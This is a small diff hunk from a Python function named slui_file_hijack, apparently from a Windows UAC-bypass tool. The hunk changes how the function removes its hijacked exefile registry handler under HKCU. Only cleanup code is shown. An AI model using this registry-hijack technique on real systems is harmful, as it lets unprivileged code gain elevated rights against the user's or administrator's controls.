@@ -30,6 +30,6 @@ def slui_file_hijack(executable_path):
 	except Exception as error:
 		sys.exit()
 	try:
-		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,"Software\Classes\exefile\shell\open\command")
+		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,"Software\Classes\exefile")
 	except Exception as error:
 		return False	
